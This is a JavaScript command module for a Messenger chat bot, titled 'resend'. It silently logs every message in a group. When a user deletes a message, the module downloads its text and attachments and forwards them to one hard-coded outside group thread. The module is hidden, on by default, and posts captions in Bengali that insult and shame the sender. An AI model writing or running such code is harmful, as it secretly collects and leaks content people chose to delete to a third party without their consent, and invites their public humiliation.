const fs = require("fs-extra");
const axios = require("axios");

module.exports.config = {
 name: "resend",
 version: "2.2.0",
 hasPermssion: 0,
 credits: "CYBER ☢️_𖣘 -𝐁𝐎𝐓 ⚠️ 𝑻𝑬𝐀𝐌_ ☢️ (Modified by SHONIK)",
 description: "Auto resend removed messages to specific group",
 commandCategory: "general",
 usages: "[on/off]",
 cooldowns: 0,
 hide: true,
 dependencies: { "fs-extra": "", axios: "" }
};

// ====================== EVENT HANDLER ======================
module.exports.handleEvent = async function ({ event, api, Users }) {
 const { messageID, senderID, body, attachments, type } = event;

 if (!global.logMessage) global.logMessage = new Map();
 if (!global.data.botID) global.data.botID = api.getCurrentUserID();

 // fetch thread data
 const threadData = global.data.threadData.get(event.threadID) || {};
 if ((threadData.resend === undefined || threadData.resend === true) && senderID !== global.data.botID) {

   // save messages
   if (type !== "message_unsend") {
     global.logMessage.set(messageID, { msgBody: body, attachment: attachments });
   }

   // handle unsend
   if (type === "message_unsend") {
     const msg = global.logMessage.get(messageID);
     if (!msg) return;
     const userName = await Users.getNameUser(senderID);

     // target group for all resend messages
     const targetThreadID = "2186739821790695";

     // text only
     if (!msg.attachment || msg.attachment.length === 0) {
       return api.sendMessage(
         `═════════════════════
─꯭─⃝‌‌𝐒𝐡𝐚𝐡𝐚𝐝𝐚𝐭 𝐂𝐡𝐚𝐭 𝐁𝐨𝐭
═════════════════════

কই গো সবাই দেখুন🥺
@${userName} এই লুচ্ছায়
মাত্র 👉 [${msg.msgBody}] 👈
এই টেক্সট টা রিমুভ দিছে😁

═════════════════════
𝗕𝗼𝘁 𝗢𝘄𝗻𝗲𝗿 𝗦𝗵𝗮𝗵𝗮𝗱𝗮𝘁
═════════════════════`,
         targetThreadID,
         (err, info) => {
           if (!err && info) {
             api.sendMessage({ mentions: [{ tag: userName, id: senderID }] }, targetThreadID);
           }
         }
       );
     }

     // attachments exist
     let attachmentsList = [];
     let count = 0;
     for (const file of msg.attachment) {
       count++;
       const ext = file.url.substring(file.url.lastIndexOf(".") + 1);
       const filePath = __dirname + `/cache/resend_${count}.${ext}`;
       const fileData = (await axios.get(file.url, { responseType: "arraybuffer" })).data;
       fs.writeFileSync(filePath, Buffer.from(fileData, "utf-8"));
       attachmentsList.push(fs.createReadStream(filePath));
     }

     return api.sendMessage({
       body: `@${userName} এই হালায় এই মাত্র এইডা রিমুভ দিছে🙆 সবাই দেখে নেও🐸😁${msg.msgBody ? `\n\nContent: ${msg.msgBody}` : ""}`,
       attachment: attachmentsList,
       mentions: [{ tag: userName, id: senderID }]
     }, targetThreadID);
   }
 }
};

// ====================== COMMAND ======================
module.exports.languages = {
 en: {
   on: "Resend feature has been turned ON ✅",
   off: "Resend feature has been turned OFF ❌"
 }
};

module.exports.run = async function ({ api, event, Threads, args, getText }) {
 const { threadID, messageID } = event;
 let data = (await Threads.getData(threadID)).data || {};

 // user command: /resend on or /resend off
 const option = args[0]?.toLowerCase();

 if (!option) {
   return api.sendMessage(
     "⚙️ Usage: /resend on OR /resend off",
     threadID,
     messageID
   );
 }

 if (option === "on") {
   data.resend = true;
   await Threads.setData(threadID, { data });
   global.data.threadData.set(threadID, data);
   return api.sendMessage(getText("on"), threadID, messageID);
 }

 if (option === "off") {
   data.resend = false;
   await Threads.setData(threadID, { data });
   global.data.threadData.set(threadID, data);
   return api.sendMessage(getText("off"), threadID, messageID);
 }

 return api.sendMessage("⚙️ Please use either: /resend on or /resend off", threadID, messageID);
};